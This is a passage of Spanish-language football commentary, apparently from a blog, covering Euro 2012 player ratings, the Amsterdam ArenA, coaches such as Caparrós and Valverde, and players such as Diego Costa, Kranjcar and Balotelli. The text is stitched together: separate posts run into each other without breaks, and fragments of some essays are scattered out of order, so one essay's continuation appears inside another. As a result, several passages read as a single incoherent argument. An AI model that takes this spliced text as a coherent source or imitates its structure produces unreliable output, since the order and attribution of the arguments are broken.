decente a partir del trío Adam–Fletcher–Naismith, y que Kenny Miller es un estupendo goleador, aunque ya esté en la cuesta abajo. Algo parecido pasa en el otro lado, un equipo en renovación donde el ex osasunista Plasil pasa por el mejor, y Rosicky o Baros vienen de vuelta. Ambos han conocido tiempos mejores.Pronóstico: España y República Checa. Los seguidores de nuestra antigua serie Grandes Estadios recordarán cómo hemos pretendido recordar un poco la historia de algunos de los coliseos de más rancio abolengo en el fútbol mundial: Hampden Park, Pequeño Maracaná, La Bombonera, Atocha…  Hoy, aprovechando que el Real Madrid visita por primera vez en partido oficial el campo en el que de algún modo inauguró su historia moderna, queremos dedicar unas palabras al que es probablemente uno de los paradigmas de la modernidad en cuanto a recintos deportivos se refiere: el Amsterdam ArenA.A finales de los 80 ya comenzaba a verse que la afición del Ajax, el club más laureado de Holanda, necesitaba un nuevo hogar. El viejo de Meer, entrañable y mítico, hacía tiempo que se caía a pedazos, y sus poco más de 30.0000 localidades no podían ya acoger a una afición cada vez más numerosa. El proyecto inicial se gestó con vistas a la candidatura de Amsterdam para los Juegos Olímpicos de 1992, y el diseño definitivo tomó cuerpo precisamente ese año. Acorde con la aureola cosmopolita y chic que rodea al club ajacied, se planteó la construcción de un recinto muy innovador, multifuncional, suficientemente amplio –más de 50.000 localidades de asiento-, y con un impresionante tejado retráctil como seña de identidad.La obra se realizó en un tiempo récord de cuatro años, y su inauguración resultó todo un acontecimiento en Holanda: acudió la reina Beatriz, se simuló un mar sobre el césped con barquitos que representaban a todos los equipos de la Eredivisie, y se organizó incluso el traslado de una antorcha, por relevos, desde de Meer, en una carrera que duró ocho días, que comenzó Cruyff y que concluyó Frank Rijkaard. Cinco estrellas de la UEFA, el campo acogió la final de la Champions dos años después de su inauguración, y durante varias temporadas ejemplificó una perfecta simbiosis con el impresionante equipo, joven y atrevido, que había montado Luis van Gaal con futbolistas procedentes casi en su totalidad de la cantera. Fueron tiempos de maravillar al mundo exportando una imagen inimitable, que conjugaba adecuación a los nuevos tiempos, preciosismo, eficacia y multiculturalidad.Con el tiempo y la ley Bosman llegó el declive al equipo, pero el estadio conserva su doble status como multiespacio y templo futbolero: como lo primero, ha acogido conciertos sin número, es sede permanente de un festival de baile y en él jugaron sus partidos como local los Amsterdam Admirals de la NFL Europa; y en cuanto a estadio, además de la mencionada final de la Copa de Europa y de finales de Copa holandesas, fue sede de varios partidos de la Eurocopa 2000. Más de 17 millones de visitantes entre 1996 y 2006 dan idea de la importancia del recinto, que sobrepasa lo deportivo y se ha convertido en una de las mayores atracciones turísticas de Amsterdam; y más de 500 eventos celebrados en él ese mismo periodo indican el camino de lo que debe ser hoy día el planteamiento de un gran recinto deportivo. El ArenA marcó el camino. Sobresaliente: Mario Gómez. Pocas cosas ayudan más a un futbolista a tener de su lado a la crítica que poseer movimientos gráciles y estéticos. Vaguee durante 89 minutos, sea un cero a la izquierda para el equipo, cierre el partido con una cola de vaca y los fans se derretirán. En el otro lado de la balanza andan los Mario Gómez del mundo. Da igual que las cifras goleadoras sean de videojuego, los contrarios le teman y sea titular casi invariable donde juegue, que es raro escuchar tres frases sobre él en las que no aparezca la palabra “tronco” o algo similar. El tronco en cuestión, después de hacer esta temporada cuarenta goles con el Bayern, monopoliza por ahora la producción tanteadora de su selección en esta Eurocopa. Anoche ultimó a Holanda con dos goles completamente diferentes entre sí –control orientado y uno contra uno, trallazo inapelable- y marca de momento la diferencia con otras selecciones que no tienen o no alinean a ese jugador sediento de sangre. El nueve más clásico del fútbol actual.Notable: Pepe. Concentrado, rápido, con todas las virtudes que han adornado su gran temporada en el Madrid y –de momento- sin ninguna de las crisis mentales que le señalan como un desequilibrado, el central de Portugal se ha erigido en caudillo de un equipo huérfano de carácter y liderazgo. Ante la desventura de Cristiano Ronaldo y la inoperancia de un centro del campo lleno de futbolistas que se han quedado en menos de lo que apuntaban, Pepe es el icono más reconocible de una escuadra que tiene los cuartos más cerca de lo que se esperaba en un principio. Además, adornó su actuación con el gol del central de toda la vida.Aprobado: Nicklas Bendtner. Una parte de la maldición de la que hablábamos más arriba afecta a este espigado ariete danés, si bien es justo señalar que su nivel futbolístico se halla muy lejos del de SuperMario. Capaz de gestos técnicos aislados de gran mérito, Bendtner se muestra en general como un futbolista torpe de movimientos, fallón ante el marco y bastante poco efectivo. Wenger le apoyó durante años, pero la realidad acabó imponiéndose y la cesión del Arsenal al Sunderland no extrañó a nadie. Ayer vivió un día agridulce, por un lado el doblete con el que sueña todo atacante de un gran torneo, por otro la derrota a última hora de su selección, y que le complica bastante la vida en la última jornada. Él se llevará a casa los dos testarazos, sencillo el primero, más meritorio el que fue el empate. Algo es algo.Suspenso: Van Marwijk. No le bastó al seleccionador oranje con la escasa producción de juego de su equipo contra Dinamarca, que anoche insistió con ese absurdo doble pivote que prueba fehacientemente que en fútbol uno más uno no tiene por qué ser dos. Huérfana de creación, y a pesar de que De Jong jugó un muy buen partido en el aspecto defensivo, Holanda padeció el superior juego colectivo de los alemanes, que aprovecharon a la perfección las imprecisiones del centro del campo naranja. Luego ya sí, con 2-0 salió Van der Vaart, ahora ya sí podían jugar juntos Van Persie y Huntelaar, y por arte de magia los tulipanes acortaron distancias y, casi hasta el final, amenazaron con el empate. Se asumen más riesgos, claro, pero un riesgo controlado si tienes buenos jugadores. Si  no hay carambola final, Holanda se va a marchar de Polonia-Ucrania dejando la impresión de tener futbolistas para mucho más.Eziolino, como es conocido por allí, es un entrenador extravagante y de verbo atómico. De los de chándal, discurso grosso y mil envites en el infrafútbol italiano. De los que en Argentina pelearía el ascenso y en España alternaría en la barra con Luis Ángel Duque, David Vidal o Luiche, ese señor que a fuerza de escuchar su obra en boca de Enrique Ballester he llegado a colocar en el ámbito de lo mitológico. El caso es que Eziolino es tendencia fuerte en Italia porque al principio de temporada declaró sin rubor en varios debates futbolísticos de la televisión local (otra que nos cuelan los italianos) que Mertens no jugaría más de ocho partidos con el Nápoles. 33 partidos y 11 goles en Italia, figura el primer día en el país de fútbol. No sé si sale más a cuenta tirar los dados o escuchar a los expertos…Pienso en Bélgica y en Chile, en España. En las expectativas y en las sorpresas que penden de un hilo. En lo parabólico. En lo bonito que es un Mundial cuando se pierde el pdf. Esperando la dosis de infrafútbol, como un yonqui me acerco a la esquina. Pido rojas y me dan verdes, lo mismo da porque cualquier tren me lleva. Esperando que arranque la muy infrafutbolera carrera del Oviedo hacia el mundo real me entretuve un rato con el Manchester CIty. Al all star team le calzaron el primer guantazo del año, al aparato el Sunderland de Martin O’Neall. El United había dado la de cal y el City olió la herida pero fue incapaz de separase del enemigo en la pelea por este campeonato que debe ser el suyo. La Premier queda así un poquitín más indescifrable y eso son buenas noticias.Si sale un coreano del banquillo para ganarte el partido en el 93 (en fuera de juego todo hay que decirlo) y ves que tu equipo desmonta al otro jugando con dos centrocampistas en los laterales, defendiendo como nunca, sabrás que en tu caseta hay alguien que piensa. Miras abajo y por ahí anda Martin O’Neall, suspiras y das las gracias a la directiva porque ese tío ha resucitado al Sunderland. Ha arrancado diez puntos sobre quince posibles y al equipo ya le corre la sangre por las venas. Casi nada.Contó para el resultado final que Mancini reservó cromos clave con la vista puesta en el mes que se le viene encima. Pese a todo el City atacó con inquebrantable voluntad y energía durante prácticamente todo el encuentro, como si en el banquillo no fuera cosa de este italiano, y demostró que sigue siendo el principal candidato al título. Seguramente al final de temporada, a la hora del balance, hablaremos de un Manchester City sólido en conjunto pero ayer les faltó algo de chispa. La que le viene faltando. No así voluntad y actitud, ingredientes que sumados a lo evidente pueden darles la Premier.Premier abierta y la posibilidad de un campeón diferente a lo habitual, rueda con rueda con su rival eterno hasta el final. Más no se puede pedir para arrancar el año. La fiesta del fútbol tiene caminos retorcidos. Recomendamos acompañar esta breve recopilación sobre cosas que no podrías hacer hoy en un campo de fútbol con la escucha de un tema inmortal.1967. 3.000 aficionados del Queens Park Rangers recorren a pie los 10 kilómetros que separan Loftus Road del viejo Wembley para asistir a la final de la Copa de la Liga ante el West Bromwich Albion. En una especie de charanga macabra muy alejada de los lugares comunes del fútbol inglés que seguimos empeñados en comprar, van disfrazados de sepultureros y fantasmas mientras portean un ataúd en el que se puede leer ‘RIP WBA’. Más allá de la risotada ebria, el circo adquiere beneficios sustanciales cuando el QPR levanta aquel trofeo. Teniendo en cuenta que los londinenses eran equipo de tercera división y visto el ánimo previo, la fiesta tuvo que ser antológica.Embed from Getty ImagesEmbed from Getty ImagesEn 1962, durante un partido decisivo para el ascenso a primera contra el Nápoles, los ufanos seguidores del Verona fabrican una pancarta para desearle lo mejor a su delantero Guido Postiglione y pasean un ataúd con la leyenda ‘Adios a la Serie B’. Dicho encuentro debió haberse jugado meses atrás pero las sospechas de que varios jugadores veroneses estaban comprados provoca su aplazamiento. Entre ellos estaba el homenajeado y ex del Nápoles, Postiglione. Pero como en el infrafútbol suele suceder lo previsto, en aquella ocasión gana el sur y Verona debe esperar pacientemente durante seis temporadas para regresar a la máxima categoría.Embed from Getty ImagesUnas cuantas mentes preclaras en la grada de la Sampdoria comparan el fútbol italiano con un ataúd destartalado. El motivo de tan certeras metáforas con el calcio podría ser cualquiera pero en 2011 era el nuevo sistema de horarios que obliga a jugar los viernes o los lunes. El club, que viene de ser cuarto en la anterior campaña, desciende a la B. Sin embargo, el verdadero funeral llega en la  antepenúltima jornada, cuando la Sampdoria se despide de la élite perdiendo el derbi contra el Genoa.Embed from Getty ImagesSudáfrica, lo macabro durante un Eslovenia-Inglaterra en el Mundial de 2010. El ataúd no fue suficiente para condicionar de alguna manera mágica el futuro de los eslovenos, sí la puntería de Jermain Defoe, que apareció puntual para amarrar el pase de los ingleses a octavos de final.Embed from Getty ImagesNewcastle-Wolverhampton Wanderers de liga en 2012.La lectura tras aquella gesta era que Grecia era un insulto al fútbol, dar un premio a quien menos lo había merecido. Ranieri, por cierto, no pudo hacer nada al frente de Grecia, justo antes de fichar por el Leicester para hacer historia.Ahora con el equipo inglés somos más permisivos. Su racanería se ve con condescendencia y hasta entusiasmo. Ganar una liga, frente a United, Chelsea, City o Arsenal, debe ser algo maravilloso. Pero tengo la misma sensación con los espontáneos aficionados que con el chico que hacía como que cantaba Purple Rain, que son todo impostura. Son los que iban con el Swansea y luego con el Wigan. Los del Liverpool de Benítez y los del Everton de ahora. Los que pasan la tarde viendo a Kanté y después tienen abandonados a los equipos de sus ciudades, de sus barrios. Tengo tanta simpatía por el Leicester como por el Club Deportivo Maspalomas. Eso no me ciega ante su machada. El fútbol es maravilloso por cosas como estas, por equipos como estos. Dentro de ese vestuario tiene que haber magia. Ganan porque quieren ganar. Más que nunca, el fútbol es un estado del ánimo. Entiendo que la afectación es parte de nuestra historia íntima, que el ocio nos lleva a seguir a equipos que no nos importan. O a lo mejor es verdad, a lo mejor el chico del Seat León adora a Prince, conoce cada uno de sus temas, y su momento en el coche era para sí mismo y no para las guiris.A lo mejor, también, los aficionados al fútbol que tuitean y cambian sus avatares por fotos de Vardy son del Leicester de siempre. Los han seguido en First Division, han ido a su estadio, coleccionan sus camisetas. Como hago yo con el Córdoba o Sergio con el Oviedo u Oscar buscando excusas para ir a ver al Betis cuando juega cerca de Barcelona. Historias de aficionados normales, mundanos, provincianos. Que bastante tenemos con lo nuestro como para ir por ahí con el aplausito a los demás. A lo mejor el de la impostura soy yo, que creo que en mi corazón hay espacio para pocas cosas: un par de equipos, tres o cuatro bandas y un buen puñado de canciones. El fútbol es un espectáculo siniestro. En él veintidós jugadores patean un balón de cuero a través de un campo hostil. Sudan, se agarran, mienten y gritan. Defienden y atacan con marcialidad bien pagada. Los clubes son entidades opacas, con criterios espurios, que hacen o dejan de hacer según lo dictado por el agradable tintineo del dinero.Algunas mañanas me despierto con un profundo asco al fútbol. A todo lo que arrastra y me supera.Tampoco necesitaron los italianos de mucha mano fina. En un centro del campo con más trote que piaffé y en el que Pirlo es cada vez más el suspiro de un recuerdo que pierde su batalla contra el reloj biológico, Pogba acabó por imponerse a base de empuje. No fue su mejor partido con el balón en los pies, pero de su hercúlea presencia en el área de Casillas nació la jugada del gol de Álvaro Morata. El madrileño contribuyó con su tanto a lo novelesco del duelo. Como Bruto con Cayo Julio César. Tu quoque, Álvaro, filii mei? El repudiado, aquel que no podría tener minutos, el que se hizo hombre a fuerza de colpi di testa de domingo a domingo contra un ejército de Giancarlos y Massimos, ejerció de moderno Zalayeta y puso de nuevo en evidencia que la actitud defensiva del Real es del todo impropia de un equipo al que se le exige siempre la cúspide. Y tal vez no sea culpa de los futbolistas. Ni tan siquiera de su técnico. Igual la responsabilidad recae sobre un modelo que exige cosas a quien no debe exigírselas. Que le pide a un mediapunta de fino toque y liviana presencia como Kroos que actúe como el más rocoso de los mediocentros en tarea defensiva. Que incita a los laterales a vivir casi permanentemente en campo rival so pena de parecer un equipo tirado para atrás. Que ha hecho creer a cierto sector de su público que ganar no es suficiente y que la excelencia pasa por masacrar.Sea como fuere, el Madrid asumió el gol en contra justo al contrario de como lo había hecho la Juve en el primer tiempo. Porque el Madrid sí que se descompuso. Rebuscó en su zurrón pero no encontró absolutamente nada cuando el partido le requería una marcha más. Trató de echarse en manos de Cristiano, el ídolo por el que el Bernabéu diseña campañas de reconocimiento cada cierto tiempo. Pero el portugués estaba tan aturdido como el resto de sus mortales compañeros. Nada distinguió anoche en la segunda mitad al futbolista que debería de marcar las diferencias del resto de los comparecientes y sería oportuno apuntarlo dentro de esa retahíla de cuitas pendientes acumuladas que acostumbra el madridismo a reprochar cuando su equipo no cumple con las expectativas. Pese a que quedaba un mundo por disputarse, no supo, o no pudo, el Madrid recuperar las constantes vitales. Tiró de pasión a través, sobre todo, de un jugador tan escasamente pasional como Gareth Bale. Pero el asedio fue en vano. La Juventus terminó de italianizarse cuando la situación más lo requería. Convirtió la caldera de Chamartín en una trattoria en la que las cosas se sucedían al itálico modo. Anestesió el partido en sus últimos diez minutos y no pareció sufrir en demasía para mantener su resultado.En la resaca se habla, y se seguirá hablando durante semanas, de catarsis.De renovación profunda, de la imperiosa necesidad de saneamiento de la plantilla… lo de siempre. Lo de cada verano que sigue a un curso en el que las expectativas no se han visto satisfechas. Son las consecuencias de vivir siempre al límite del riesgo y con el nivel de exigencia desbordado. Siempre esclavos de una historia, la madridista, que no tiene espacio en sus páginas para aquellos que estuvieron cerca pero no lo consiguieron. Pese a que como mero espectador no comulgo con su propuesta, nunca sería tan torpe de negar méritos a Joaquín Caparrós. Lleva una vida dirigiendo partidos en Primera división, ha sabido adaptarse a clubes de lo más variopinto y, sobre todo, ha sido valiente en las decisiones que han guiado su trayectoria en los banquillos, algo que contrasta sorprendentemente con el fútbol pragmático y reservado que han venido poniendo en práctica sus distintos equipos. Valiente en la vida y prudente, tal vez en demasía, sobre el césped.Joaquín Caparrós es, o debería de ser, el adalid de todos aquellos que alguna vez soñamos con ser futbolistas y a los que la realidad nos devolvió a nuestro mediocre lugar a base de burlones hostiazos. O sea, tú, yo y todos los que estamos aquí. Porque la sensación que transmite el técnico de Utrera es que, bajo su mandato y su dirección técnica, casi cualquiera con un poco de empeño y una notable dosis de esfuerzo podría llegar a triunfar de corto. Y no quiero con esto menospreciar a los muchos y muy buenos futbolistas que ha tenido a sus órdenes, pero sí que quiero dejar claro que muchos de sus peones más apreciados jamás habrían logrado protagonismo alguno en manos de cualquier otro entrenador. Y sí, estoy pensando en cierto futbolista vitoriano.Y es ése precisamente el mayor mérito de Caparrós. Saber aglutinar esfuerzos en la búsqueda de un bien común es una maniobra que muchos técnicos tratan de implementar pero que muy pocos consiguen hacerlo con la eficacia que exhibe el método caparrosiano. Es esa ‘sugestión positiva’ de la que tan acertadamente habla una referencia del granadinismo como Rafa Lamelas. Todo es bien recibido en los albores del caparrosismo. Se aplauden hasta los despejes a tierra de nadie, se celebra la resistencia, se ensalza la precaución y la cautela, porque el público sabe que es el camino más directo para, al menos, solucionar problemas latentes. Y es por ahí por donde ahora discurre este Granada recién estrenado que acumula puntos y se encarama donde hace unos meses era incapaz de soñar. Lo que muchos desconocen es que el problema real es el que aparece con el paso de los meses. El que origina que, ante la estabilidad de tu equipo y su soltura para amarrar puntitos por aquí y por allá, quieras exigirle ese poquito más que te permita luchar por nuevas metas. Es ahí donde pienso que Caparrós y su sistema, tan útil en determinadas circunstancias de premura y urgencia, llegan hasta donde llegan. Joaquín resuelve problemas. Lo hizo en Sevilla, rescatando al equipo de Segunda y disparando la cotización de varios de sus futbolistas, en Bilbao, en Palma y en Orriols. Y parece estar haciéndolo en Granada. Es la fase del plan que mejor controla. En la previa del partido de Liga de Campeones que medirá al Athletic Club con el Shakhtar Donetsk, Ernesto Valverde volvió a insistir en el lema que ha protagonizado toda la trayectoria del equipo rojiblanco en la actual edición del torneo continental. ‘Nuestra prioridad sigue siendo la Liga‘, se empeña en repetir el técnico extremeño como tratando de poner la venda antes de sufrir la herida. Tiene razones de peso para protegerse y salir a la arena bien guarnecido. No es el Athletic un equipo que por plantilla y aspiraciones reales pudiera plantearse el hecho de irrumpir en un escenario como la Liga de Campeones y tratar de cumplir con ese objetivo tan difuso pero tan recurrente de ‘hacer algo grande en la competición’. Es más, dudo mucho que nadie en Bilbao fuese a exigir al equipo que compitiese de igual a igual con los grandes clubes del continente, porque sí somos algo fanfarrones, pero no inocentes. Sin embargo, con esa actitud proteccionista el técnico está enviando un peligroso mensaje implícito a la plantilla: los partidos europeos son de una importancia relativa.La participación europea de un Athletic ya virtualmente eliminado de esta Liga de Campeones ha dejado un sabor de boca ciertamente amargo entre la afición rojiblanca. Después de haber eliminado brillantemente al Nápoles de Benítez en la ronda previa, la euforia estaba disparaba en el Botxo. El resultado del sorteo de la fase de grupos fue recibido con gran esperanza: un grupo con rivales accesibles y libre de gigantes continentales permitía al Athletic soñar con el pase a la ronda de octavos de final. La realidad, en cambio, iba a devolver una imagen y un rendimiento del equipo absolutamente imprevistos. Europa es otra historia, como demostrarían sucesivamente el Shakhtar, el BATE y el Oporto.Entiendo que Valverde busque suavizar la presión de los suyos restando relevancia al torneo continental y centrándose en una competición liguera que permite un amplio margen de error en comparación con la intensidad europea. Me centro en el recuerdo del aciago partido de Borisov (segundo en la fase de grupos) y pienso que el Athletic, aun centrado en la Liga, podía haber hecho bastante más en esta competición. No se trataba de exigir imposibles a un equipo que, no lo olvidemos, tiene unos límites bien palpables. Pero sí de que el equipo respondiese e hiciese todo lo posible por evitar el desenlace ya conocido. Se trataba al menos de comparecer, de no menospreciar la histórica oportunidad y de que el Athletic otorgase a una competición que hacía dieciséis años que no visitaba el tratamiento que merecía. Insistirá Valverde, pase lo que pase en Lviv esta noche, en que la prioridad rojiblanca es y será la Liga (dubitativo comienzo para haber sido considerada prioritaria) y que la participación en Liga de Campeones es ‘un regalo‘ de los jugadores a la afición. Quitará importancia a un torneo único, a una oportunidad que para Bilbao es súmamente esquiva y que merecía mayores cuidados y atenciones, porque nunca sabremos cuándo podremos volver a paladearla. A costa incluso de algún ligero despiste en la Liga. Nos encanta tratar de solucionar problemas creando otros nuevos. Sea de manera involuntaria o sea ignorando los riesgos de modo imprudente, el caso es que el fútbol suele ser poco dado al análisis concienzudo y sosegado con anterioridad a la toma de decisiones trascendentales. Hace unos meses, Diego Costa irrumpió como un ciclón en el corrillo de charla de la opinión pública. Era el delantero de moda, el futbolista que aglutinaba portadas y coleccionaba elogios semana tras semana. De pronto, el asunto de su incorporación a la selección nacional, que caminaba decidida hacia la cita del Mundial de Brasil convencida de la posibilidad de prolongar éxitos, se convirtió en una decisión de Estado.No había sido aún resuelto el tedioso e intrincado papeleo (actas notariales, mensajes cruzados entre la federación brasileña y la española…) que siempre conlleva un caso como el del delantero hispano-brasileño y Costa parecía ser el único futbolista con plaza reservada en la cita brasileña. Con la sensación de urgencia siempre presente, el excolchonero debutó con España (ante Italia, en amistoso en el mes de marzo) con el tiempo justo para entender que era lo que Del Bosque quería de él en el inminente Campeonato del Mundo. Porque siempre ha dado la sensación que todo lo que ha rodeado al binomio Costa-España ha venido ejecutándose por la vía de apremio. Saltando por encima de lesiones y bajones físicos, de problemas de ensamblaje en el sistema de juego y de la innegable presión extra a la que se ha visto sometido un delantero extrovertido y polémico como pocos.El caso es que el tiempo juega ya en contra de la definitiva incorporación de Costa al combinado nacional. Son ya siete partidos con la camiseta española y su casillero aún sigue en blanco, exhibiendo una versión muy alejada de la del delantero mordaz y extremadamente regular que fuera con el Atlético de Madrid y que está resultando ser en el Chelsea. La afición española espera pacientemente a Diego Costa. Un poco como Vladimir y Estragón esperan a Godot bajo el árbol. Sin saber muy bien por quién aguardan y quién es ese tal Costa. Debatiendo, mientras tanto, sobre lo divino y lo humano, decidiendo qué hacer con el futuro, argumentando sobre por qué Piqué no rinde como debería o sobre si Casillas está pidiendo a gritos ser parte del relevo generacional… Y, en definitiva, acomodada en el inmovilismo. Es el candente debate de la portería, común a los tres equipos más fuertes de nuestro campeonato, un problema moderno. Un complejo asunto propio de los tiempos que corren, como el estrés, la vigorexia o los botines de fútbol estampados en mil colores imposibles. Porque no recuerdo yo semejantes dilemas entre los tres palos allá cuando los equipos, incluso los grandes equipos que peleaban por los títulos, confiaban el siempre delicado asunto de la portería en los hombros de un único guardameta. No recuerdo yo excesivo debate sobre la titularidad en la portería del FC Barcelona cuando Andoni Zubizarreta, mal o bien, hacía imponer la ley de su leyenda en Can Barça. Lo mismo puede afirmarse acerca de Paco Buyo, hoy metido a prescindible guiñol televisivo y antaño eterno e inamovible guardián de la tierna flor del madridismo.Y no me refiero a la mafia solo, sino a las derrotas, a la impotencia, a la sinrazón de embargar tu vida al azar y el músculo, de esta hipoteca furiosa de césped y balones al palo. Náusea por no entender el vaivén de un amor irracional, indescifrable y tierno.Sólo encuentro equilibrio cuando pienso en el aficionado. Toda esa gente con su disfraz de colores que se dirige al campo con disciplina infantil, como parvulitos que arrastran su mochila con las legañas aún y la cara hinchada por el sueño. Así los veo cruzar las calles cercanas al estadio, fantaseando con la victoria con una cerveza en la mano, comprando pipas y la bufanda atada a la cintura porque ya llega el calor del verano.El verano que marca las intrigas y los descensos. La gloria, lejana o espaciada en el tiempo, es minoritaria. Aquí los éxitos no caen repartidos, como en la Lotería de Navidad. Aquí somos demasiados aficionados pidiendo lo que sólo llega a unos pocos. Y cuando llega, como le llegó al Córdoba hace un año, no siempre es para dorar el futuro. No siempre es para voltear la humilde existencia. A veces, la suerte es una casa sin ventanas.Escribía Antonio Machado que hay buena gente que “donde hay vino, beben vino; donde no hay vino, agua fresca”. Pienso en el cordobesismo, en el seguidor sencillo, en el vino de Primera, y ahora en esta densa agua de la Segunda. La que toca beber tras probar lo mejor del fútbol, salir en los resúmenes de televisión, en los periódicos, en los cromos y en las tertulias.Ayer perdía el Deportivo, el Granada tampoco levanta cabeza, el Eibar sigue su caída terrible, en Segunda el Recreativo toca el suelo, el Racing se deshace como el azúcar, Osasuna da sus últimos zarpazos. ¿No es demasiada carga esta que llevamos ya a la espalda? ¿No hay algo febril y estúpido en el fútbol? ¿Qué hace que el aficionado avance en el desierto del fútbol, con ropa humilde y pies heridos?Y eso es muy triste. El Real Madrid sigue pescando en la Bundesliga. Tras la revelación de Özil y la titularidad habitual de Khedira, los dirigentes blancos parecen haberse convencido de que la Bundesliga en un buen fondeadero donde obtener futbolistas válidos y baratos. Con Sahin confirmado, hoy le toca el turno a Hamit Altintop, un jugador que a diferencia de los anteriores, está ya bastante de vuelta a pesar de sus 28 años. Lo que normalmente se conoce como un comodín, el mejor de los gemelos es un centrocampista cumplidor, más recio que técnico, con recorrido, carácter, llegada –su disparo de diestra es temible- y bastante compromiso defensivo. Aunque su demarcación natural se aproxima a la de interior clásico, ha jugado también de mediocentro y de lateral. Sin ser una estrella ni pretenderlo, seguramente eleva el nivel de los medios del Madrid, la línea más floja del equipo esta temporada (Xabi Alonso aparte). Un perfil muy Mourinho, pues, para un jugador que ha llegado a coste cero, y que antes destacó en el Schalke y dotó de fondo de plantilla al Bayern. Veremos cómo responde al cambio de fútbol. Uno siempre tiene la sensación de creer que en el penalty lo ha visto todo. Parece una suerte tan reglada, tan coreografiada, tan sumamente previsible, que la única incógnita que aún nos estimula es la duda sobre la consumación, sobre si el balón tocará red, si lanzaremos el grito de alegría o el suspiro de desesperación. . Nos da igual que Panenka se inventase una bendita locura para acabar con el monopolio del fútbol alemán, que Cruyff le sacara partido a leerse la letra pequeña del reglamento, o que Sócrates reventase los límites del barroquismo sacando a pasear su tacón de terciopelo. Creíamos que nada podía añadirse ya cuando el joven Calvente invadió el territorio de lo inverosímil lanzando con la pierna de apoyo. Y hoy, vía el gran Filippo Ricci, agachamos la testa y confesamos que todo está por inventar cuando contemplamos –miren el video adjunto- cómo el momento glorioso de los once metros, la suerte suprema, puede asumirse desde una suficiencia tal que se lo considere poco más que un trámite en la realización del escorzo imposible. Larga vida a Jokinen, larga vida los iluminados. Se le echa de menos en este mundial. Durante años, nos acostumbramos a la presencia de Bora Milutinovic en los mundiales, a su silueta desgarbada, a su aire simpático, bonachón y mundano. Cinco torneos le contemplaron, con selecciones de lo más variado –México, Costa Rica, Estados Unidos, Nigeria y China- y a todos menos a los asiáticos consiguió meterlos en la siguiente ronda. Para este mundial fracasó con los iraquíes, a quienes ya había dirigido en la Copa Confederaciones, pero pocos dudamos de que en cuatro años, cuando ya se acerque a los 70, volverá a la carga. Un viejo rockero, Miracle Worker. Parece hoy un buen momento para  hablar de Niko Kranjcar. Sus dos últimos golazos frente a Sunderland y Bolton, en los que ha sacado a pasear el Remington de precisión que tiene en su pierna derecha, han vuelto a poner su figura desgarbada -casi displicente- en los menús de los Maldinis de medio mundo. El aval que le brindan esos dos tantos, la sanción de Jenas y los problemas físicos que arrastran Modric y Bale parecen asegurarle un puesto en el once que sacará esta noche el viejo Harry Redknapp al venerable césped de San Siro.Considerado desde su juventud como el hombre a seguir de su generación, Niko apareció como una centella en su Zagreb natal, debutando con el histórico Dinamo con diecisiete añitos, y protagonizando el escándalo subsiguiente al cambiar el azul de su club por la zamarra blanca del archienemigo Hajduk. Fino y elegante, con un regate seco casi indefendible y un preciso desplazamiento de balón que complementan a su estupendo disparo, su salto al gran fútbol no se hizo esperar, aunque entró en la Premier un poco por la puerta de atrás que le ofreció un Portsmouth aspirante a la grandeza vía los dólares de Gaymadak. Tres años y una Copa después, Kranjcar había confirmado punto por punto lo que ya íbamos sabiendo de él: era un futbolista de técnica descomunal, capaz de detalles que pocos pueden ni soñar.Sin embargo, tanto en el Pompey como en su posterior singladura con los Spurs descubrimos otra cosa de Niko: su intermitencia. En realidad, no es un futbolista que desaparezca durante los partidos, sino que de vez en cuando –a veces, tras varias semanas- sale del limbo para soltar un picotazo, el toque de genio, la acción maravillosa que provoca caídas masivas de quijadas. Y luego, vuelta a la nada. Un jugador de resúmenes, pues, más que de partidos, que ni siquiera es ya titular habitual con los lillywhites,  y en cuyos pies estará sin embargo el destino del equipo que seguramente más nos divirtió en la prescindible liguilla de la Champions League. Esperemos que esta noche toque chispazo, y podamos mantener durante unos días la ilusión de que el más dotado de los pirotécnicos se ha transformado, definitivamente, en gran futbolista. For the good of the game. Fue excéntrico, a veces desagradable y en ocasiones incluso un poco lunático, pero si se recuerda a alguien en especial del choque de trenes en Berlín entre Argentina y Alemania, tiene que ser a Jens Lehmann.Por no hablar de Abel Resino, siete temporadas encargado de mantener el orden en el área colchonera y cromo impertérrito en manos de, al menos, un par de generaciones de chavales.Pero el fútbol actual pide otra cosa. Pide una plantilla sin fisuras, sin puntos débiles ni carencias de ningún tipo. Exige dos estrellas por posición, capaces cada una de ellas de saltar al campo sin que el equipo se resienta en su rendimiento colectivo. En un fútbol especializadísimo en el que cada vez quedan más difusos los conceptos de ‘titular’ y ‘suplente’, contar con un portero único cuya preeminencia no se discuta es de débiles, de pequeños, de equipos de esos de los que sí pueden jugar a las doce de la mañana del domingo. Ya no se trata de tener un buen portero suplente preparado ante una posible lesión del titular. Se busca un segundo portero capaz de poner en duda y suscitar el debate sobre una posición tan peculiar como la de guardameta. Queriendo reforzar un teórico punto débil, hay quien está fomentando una discusión baldía y eterna en el seno de su club. Como si en la ausencia de problemas hubiese que crearlos. Porque nadie en su sano juicio invierte diez millones de euros en un portero para confinarlo al banquillo.No creo, a partir de ciertos niveles, en las rotaciones y la alternancia en la portería. Entiendo que la confianza ciega y la estabilidad en su puesto son dos fuerzas que inciden directamente en el rendimiento de un arquero. Y, sobre todo, rechazo el debate injusto y los juicios de valor con argumentos de barra de bar. En una posición en la que los fallos acostumbran a ser fatales, el que juega lo hace sometido a la criminalización del error. El que no está es que el que nunca falla, el que siempre debía de haber sido titular y el que nunca se hubiera comido ese balón por alto. Y eso, hablemos de ter Stegen, de Oblak, de Moyà, de Casillas, de Bravo o de Keylor, es razonar sobre hipótesis. Un buen día, alguien tuvo la feliz ocurrencia de llamar ‘genio’ a Mario Balotelli. El chico tenía una historia novelesca detrás, una puesta en escena de apariencia espectacular y una singularidad extrema. No era frecuente ver lo que en Italia llaman un ‘bomber‘ que no tuviese los ojos claros, la barbita cuidadosamente descuidada y la melena lacia, al itálico modo. Balotelli ofrecía una estampa extraña, llamativa. La de una figura tallada en ébano ajena al arquetipo establecido. Era, además, un brotecillo refulgente en mitad del erial calcistico, un rayo de esperanza en tiempos oscuros. Tal vez por eso, por su innegable peculiaridad, comenzó a aglutinar más portadas, comentarios y alabanzas de lo que hubiese sido realmente deseable. Apenas había cumplido los veinte años y su vida, repleta de requiebros del guión, ya daba para un par de biografías no autorizadas.Con apenas veinticuatro años, Balotelli ya ha surcado los mares a bordo de cuatro gigantes europeos. Arrancó en el Inter tras despuntar en el modesto Lumezzane. De nerazzurro, y azotado por el látigo inmisericorde de José Mourinho, descubrió su amor profundo por el eterno rival de la ciudad. Trató de redirigir su carrera en el City, y cuando aquello ya empezaba a apestar a agua estancada, 